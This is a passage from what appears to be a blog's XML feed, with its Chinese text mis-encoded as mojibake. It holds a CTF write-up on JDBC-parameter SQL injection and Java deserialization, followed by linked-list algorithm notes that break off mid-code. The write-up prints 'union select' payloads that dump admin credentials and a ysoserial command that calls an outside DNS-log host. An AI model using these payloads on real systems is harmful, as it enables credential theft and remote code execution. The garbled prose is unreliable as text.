ä½¿ç”¨jdbcè¿æ¥æ•°æ®åº“ï¼Œä¸”æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æ•°æ®åº“è¿æ¥çš„è´¦å·å¯†ç ï¼Œä»¥åŠå­˜åœ¨myappåº“ã€‚<br>æˆ‘ä»¬å¯æ§çš„å˜é‡æ˜¯ dbName ï¼Œæ­£å¸¸æ¥è¯´ dbname åº”å½“æ˜¯ä¸ªæ•°æ®åº“åç§°<br>æ‰€ä»¥æˆ‘ä»¬åº”å½“æ„é€  dbname ï¼Œæ—¢èƒ½å¤Ÿä½¿æ•°æ®åº“æˆåŠŸè¿æ¥åˆ°myappåº“ï¼Œåˆèƒ½å¤Ÿé—­åˆæ‰§è¡Œè¯­å¥ï¼Œæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ä»£ç <br><a href="https://www.cnblogs.com/ljl150/p/12045942.html">https://www.cnblogs.com/ljl150/p/12045942.html</a><br>JDBCè§£ææ•°æ®åº“çš„æ–¹å¼ç±»ä¼¼äºURLè§£æï¼Œä¹Ÿå°±æ˜¯åœ¨æ„é€ è¿™æ¡è¯­å¥æ—¶ï¼š<code>dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</code><br>æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„dbNameè¢«æˆåŠŸè§£æä¸ºmyappï¼Œæœ‰ä¸¤ç§æ€è·¯æ„é€ ï¼š</p><ul><li>#çš„æ–¹å¼ï¼šåœ¨urlä¸­#è¡¨ç¤ºé”šç‚¹ï¼Œè¡¨ç¤ºç½‘é¡µä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œæ¯”å¦‚http:xxx&#x2F;index.html#aaaï¼Œæµè§ˆå™¨è¯»å–è¿™ä¸ªurlï¼Œä¼šå°†aaaç§»åˆ°å¯è§†ä½ç½®ã€‚åœ¨ç¬¬ä¸€ä¸ª#ï¼Œéƒ½ä¼šè¢«è§†ä¸ºä½ç½®æ ‡è¯†ç¬¦ï¼Œä¸ä¼šè¢«å‘é€åˆ°æœåŠ¡ç«¯</li><li>?å‚æ•° çš„æ–¹å¼ï¼Œå› ä¸ºåœ¨URLä¸­ï¼Ÿåé¢çš„å†…å®¹å°†è¢«è§†ä¸ºå‚æ•°ï¼Œå°±å¯ä»¥æ„é€ ç±»ä¼¼è¿™æ ·çš„http:xxx&#x2F;index.html?a&#x3D;1ï¼Œåé¢å†è·Ÿé—­åˆå’Œæ³¨å…¥è¯­å¥</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬æ„é€ ä¸‹é¢çš„payloadè·å–æ•°æ®åº“çš„è¡¨åï¼š<br><code>myapp?a=111&#39; union select group_concat(table_name) from (information_schema.tables);#</code><br>å¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isPK&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INT&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;isAuto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NO&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;isNull&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YES&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;remark&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VARCHAR&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;æ“ä½œæˆåŠŸ&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamps&quot;</span><span class="punctuation">:</span> <span class="number">1726551375306</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å¾—userè¡¨ä¸­å­˜åœ¨nameå’Œpwdå­—æ®µï¼Œæ„é€ ä¸‹é¢çš„payloadæŸ¥è¯¢ï¼š<br><code>myapp?a=111&#39; union select group_concat(name, pwd) from (user);#</code><br>å¾—åˆ°è´¦å·å¯†ç ä¸ºï¼šadmin admin@Rrrr_ctf_asdeï¼Œæ¥ç€åˆ©ç”¨ä¸Šé¢çš„æ¥å£æµ‹è¯•<br><img src="/2024/09/12/WebSecurity/owasptop/javadeserialization/image-3.png"><br>è¿™é‡Œçœ‹åˆ°è¿”å›çš„å€¼ï¼Œæ˜æ˜¾æ˜¯javaåºåˆ—åŒ–åçš„ç‰¹å¾ï¼Œä½¿ç”¨è·å–åˆ°çš„å‡­è¯æµ‹è¯•ç¬¬ä¸€ä¸ªæ¥å£post &#x2F;common&#x2F;user&#x2F;current æˆåŠŸæ‰§è¡Œï¼Œåˆ¤æ–­è¯¥æ¥å£å¯¹æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œä½¿ç”¨ysoserialæµ‹è¯•ï¼š<br><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a><br><code>java -jar ysoserial-all.jar URLDNS &quot;http://xho2o5.dnslog.cn&quot; &gt; f.txt</code><br>ä¹‹åä½¿ç”¨è„šæœ¬å¤„ç†ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;f.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>å°†å¤„ç†åçš„æ•°æ®ä½œä¸ºtokenä¼ è¾“ï¼ŒæˆåŠŸéªŒè¯å­˜åœ¨æ¼æ´ï¼Œä¹‹åå°±å¯ä»¥é€šè¿‡åå¼¹shellç­‰æ–¹å¼è·å–flag</p><p>å¾…åŠï¼šccé“¾ Cbé“¾åˆ†æ</p><h2 id="DASCTF-Javaååºåˆ—åŒ–-easyjava"><a href="#DASCTF-Javaååºåˆ—åŒ–-easyjava" class="headerlink" title="[DASCTF][Javaååºåˆ—åŒ–]easyjava"></a>[DASCTF][Javaååºåˆ—åŒ–]easyjava</h2><p><a href="https://blog.csdn.net/solitudi/article/details/119322658">https://blog.csdn.net/solitudi/article/details/119322658</a></p><h1 id="CVEæ¼æ´"><a href="#CVEæ¼æ´" class="headerlink" title="CVEæ¼æ´"></a>CVEæ¼æ´</h1><h2 id="Jboss-ååºåˆ—åŒ–-CVE-2017-12149"><a href="#Jboss-ååºåˆ—åŒ–-CVE-2017-12149" class="headerlink" title="Jboss ååºåˆ—åŒ–(CVE-2017-12149)"></a>Jboss ååºåˆ—åŒ–(CVE-2017-12149)</h2><p><a href="https://www.cnblogs.com/sainet/p/15632205.html">https://www.cnblogs.com/sainet/p/15632205.html</a></p><h2 id="Weblogicååºåˆ—åŒ–ï¼ˆCVE-2023-21839ï¼‰"><a href="#Weblogicååºåˆ—åŒ–ï¼ˆCVE-2023-21839ï¼‰" class="headerlink" title="Weblogicååºåˆ—åŒ–ï¼ˆCVE-2023-21839ï¼‰"></a>Weblogicååºåˆ—åŒ–ï¼ˆCVE-2023-21839ï¼‰</h2><p><a href="https://www.cnblogs.com/BlogVice-2203/p/17454727.html">https://www.cnblogs.com/BlogVice-2203/p/17454727.html</a></p><h2 id="Fastjson-ååºåˆ—åŒ–"><a href="#Fastjson-ååºåˆ—åŒ–" class="headerlink" title="Fastjson ååºåˆ—åŒ–"></a>Fastjson ååºåˆ—åŒ–</h2><p><a href="https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/">https://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> ååºåˆ—åŒ–æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘é“¾è¡¨</title>
      <link href="/2024/09/11/algorithm/List/"/>
      <url>/2024/09/11/algorithm/List/</url>
      
        <content type="html"><![CDATA[<p>ç®—æ³•ç³»åˆ—æ–‡ç« ç›®å‰æ˜¯è·Ÿç€<a href="https://www.programmercarl.com/">ä»£ç éšæƒ³å½•</a>å­¦ä¹ </p><h2 id="é“¾è¡¨åŸºç¡€"><a href="#é“¾è¡¨åŸºç¡€" class="headerlink" title="é“¾è¡¨åŸºç¡€"></a>é“¾è¡¨åŸºç¡€</h2><p>å•é“¾è¡¨ã€åŒé“¾è¡¨ï¼ˆæ¯ä¸€ä¸ªèŠ‚ç‚¹æœ‰ä¸¤ä¸ªæŒ‡é’ˆåŸŸï¼Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸€ä¸ªæŒ‡å‘ä¸Šä¸€ä¸ªèŠ‚ç‚¹ï¼‰ã€å¾ªç¯é“¾è¡¨<br>é“¾è¡¨æ“ä½œçš„ä¸¤ç§æ–¹å¼ï¼šç›´æ¥ä½¿ç”¨åŸæ¥çš„é“¾è¡¨æ¥è¿›è¡Œæ“ä½œã€‚è®¾ç½®ä¸€ä¸ªè™šæ‹Ÿå¤´ç»“ç‚¹åœ¨è¿›è¡Œæ“ä½œã€‚<br>é“¾è¡¨çš„å­˜å‚¨æ–¹å¼ï¼šæ•°ç»„ï¼ˆå†…å­˜ä¸­è¿ç»­ï¼‰ã€é“¾è¡¨(å†…å­˜ä¸­ä¸è¿ç»­)</p><ul><li><strong>é“¾è¡¨ç±»å‹</strong>ï¼šå•é“¾è¡¨ã€åŒé“¾è¡¨ã€å¾ªç¯é“¾è¡¨çš„åŸºæœ¬æ„æˆå’Œç‰¹ç‚¹ã€‚</li><li><strong>æ“ä½œæ–¹å¼</strong>ï¼šç›´æ¥ä¿®æ”¹åŸé“¾è¡¨æˆ–ä½¿ç”¨è™šæ‹Ÿå¤´ç»“ç‚¹ç®€åŒ–è¾¹ç•Œæƒ…å†µå¤„ç†ã€‚</li><li><strong>å­˜å‚¨æ–¹å¼</strong>ï¼šé“¾è¡¨é€šè¿‡éè¿ç»­å­˜å‚¨æ–¹å¼å®ç°çµæ´»çš„å…ƒç´ æ’å…¥ä¸åˆ é™¤ã€‚</li></ul><h3 id="é“¾è¡¨æ“ä½œä¸å®ç°"><a href="#é“¾è¡¨æ“ä½œä¸å®ç°" class="headerlink" title="é“¾è¡¨æ“ä½œä¸å®ç°"></a>é“¾è¡¨æ“ä½œä¸å®ç°</h3><ol><li><p><strong>è®¾è®¡é“¾è¡¨</strong> (<code>707.è®¾è®¡é“¾è¡¨</code>)</p><ul><li>å®ç°ä¸€ä¸ªé“¾è¡¨ç±»ï¼ŒåŒ…æ‹¬æ·»åŠ ã€è·å–ã€åˆ é™¤èŠ‚ç‚¹çš„æ“ä½œã€‚</li><li>ä»£ç ç¤ºä¾‹ï¼ˆå•é“¾è¡¨ï¼‰:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head; <span class="comment">// Sentinel node as pseudo-head</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°æ–¹æ³•çœç•¥...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ä»£ç ç¤ºä¾‹ï¼ˆåŒé“¾è¡¨ï¼‰:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head, tail; <span class="comment">// Sentinel nodes as pseudo-head and pseudo-tail</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°æ–¹æ³•çœç•¥...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åè½¬é“¾è¡¨</strong> (<code>206.åè½¬é“¾è¡¨</code>)</p><ul><li>ä½¿ç”¨è¿­ä»£å’Œé€’å½’æ–¹æ³•å®ç°é“¾è¡¨åè½¬ã€‚</li><li>ä»£ç ç¤ºä¾‹ï¼ˆè¿­ä»£æ–¹æ³•ï¼‰:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>, curr = head;</span><br><span class="line">    <span class="keyword">while</span> (curr != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">nextTemp</span> <span class="operator">=</span> curr.next;</span><br><span class="line">        curr.next = prev;</span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = nextTemp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ä»£ç ç¤ºä¾‹ï¼ˆé€’å½’æ–¹æ³•ï¼‰:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ N ä¸ªç»“ç‚¹</strong> (<code>19.åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ N ä¸ªç»“ç‚¹</code>)</p><ul><li>ä½¿ç”¨å¿«æ…¢æŒ‡é’ˆæŠ€å·§æ‰¾åˆ°å€’æ•°ç¬¬ N ä¸ªèŠ‚ç‚¹å¹¶åˆ é™¤ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    dummy.next = head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummy, slow = dummy;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">    &#125;</span><br><span class="line">    slow.next = slow.next.next;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>é“¾è¡¨ç›¸äº¤</strong> (<code>é¢è¯•é¢˜ 02.07.é“¾è¡¨ç›¸äº¤</code>)</p><ul><li>ä½¿ç”¨åŒæŒ‡é’ˆç­–ç•¥æ£€æµ‹å¹¶è¿”å›ä¸¤ä¸ªé“¾è¡¨çš„ç›¸äº¤ç‚¹ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (headA == <span class="literal">null</span> || headB == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">a</span> <span class="operator">=</span> headA, b = headB;</span><br><span class="line">    <span class="keyword">while</span> (a != b) &#123;</span><br><span class="line">        a = a == <span class="literal">null</span> ? headB : a.next;</span><br><span class="line">        b = b == <span class="literal">null</span> ? headA : b.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ç¯å½¢é“¾è¡¨ II</strong> (<code>142.ç¯å½¢é“¾è¡¨ II</code>)</p><ul><li>åˆ¤æ–­é“¾è¡¨æ˜¯å¦æœ‰ç¯ï¼Œå¹¶æ‰¾åˆ°ç¯çš„å…¥å£ã€‚</li><li>ä»£ç ç¤ºä¾‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head, fast = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">slow2</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="keyword">while</span> (slow2 != slow) &#123;</span><br><span class="line">                slow2 = slow2.next;</span><br><span class="line">                slow = slow.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> slow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="ä¼˜åŒ–å»ºè®®ä¸é«˜çº§æŠ€å·§"><a href="#ä¼˜åŒ–å»ºè®®ä¸é«˜çº§æŠ€å·§" class="headerlink" title="ä¼˜åŒ–å»ºè®®ä¸é«˜çº§æŠ€å·§"></a>ä¼˜åŒ–å»ºè®®ä¸é«˜çº§æŠ€å·§</h3><ul><li><strong>è™šæ‹Ÿå¤´èŠ‚ç‚¹</strong>ï¼šä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ç®€åŒ–å¯¹é“¾è¡¨å¤´éƒ¨èŠ‚ç‚¹çš„æ“ä½œï¼Œå°¤å…¶æ˜¯åœ¨æ’å…¥å’Œåˆ é™¤æ“ä½œä¸­ã€‚</li><li><strong>åŒæŒ‡é’ˆæŠ€æœ¯</strong>ï¼šå¹¿æ³›åº”ç”¨äºé“¾è¡¨ä¸­ï¼Œå¦‚åœ¨å¿«é€Ÿæ‰¾åˆ°ä¸­ç‚¹ã€å€’æ•°ç¬¬ N ä¸ªèŠ‚ç‚¹ã€æ£€æµ‹ç¯ç­‰é—®é¢˜ä¸­ã€‚</li></ul><h2 id="707-è®¾è®¡é“¾è¡¨"><a href="#707-è®¾è®¡é“¾è¡¨" class="headerlink" title="707.è®¾è®¡é“¾è¡¨"></a>707.è®¾è®¡é“¾è¡¨</h2><p>é¢˜æ„ï¼š<br>åœ¨é“¾è¡¨ç±»ä¸­å®ç°è¿™äº›åŠŸèƒ½ï¼š<br>get(index)ï¼šè·å–é“¾è¡¨ä¸­ç¬¬ index ä¸ªèŠ‚ç‚¹çš„å€¼ã€‚å¦‚æœç´¢å¼•æ— æ•ˆï¼Œåˆ™è¿”å›-1ã€‚<br>addAtHead(val)ï¼šåœ¨é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰æ·»åŠ ä¸€ä¸ªå€¼ä¸º val çš„èŠ‚ç‚¹ã€‚æ’å…¥åï¼Œæ–°èŠ‚ç‚¹å°†æˆä¸ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚<br>addAtTail(val)ï¼šå°†å€¼ä¸º val çš„èŠ‚ç‚¹è¿½åŠ åˆ°é“¾è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚<br>addAtIndex(index,val)ï¼šåœ¨é“¾è¡¨ä¸­çš„ç¬¬ index ä¸ªèŠ‚ç‚¹ä¹‹å‰æ·»åŠ å€¼ä¸º val  çš„èŠ‚ç‚¹ã€‚å¦‚æœ index ç­‰äºé“¾è¡¨çš„é•¿åº¦ï¼Œåˆ™è¯¥èŠ‚ç‚¹å°†é™„åŠ åˆ°é“¾è¡¨çš„æœ«å°¾ã€‚å¦‚æœ index å¤§äºé“¾è¡¨é•¿åº¦ï¼Œåˆ™ä¸ä¼šæ’å…¥èŠ‚ç‚¹ã€‚å¦‚æœindexå°äº0ï¼Œåˆ™åœ¨å¤´éƒ¨æ’å…¥èŠ‚ç‚¹ã€‚<br>deleteAtIndex(index)ï¼šå¦‚æœç´¢å¼• index æœ‰æ•ˆï¼Œåˆ™åˆ é™¤é“¾è¡¨ä¸­çš„ç¬¬ index ä¸ªèŠ‚ç‚¹ã€‚</p><p>å•é“¾è¡¨ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 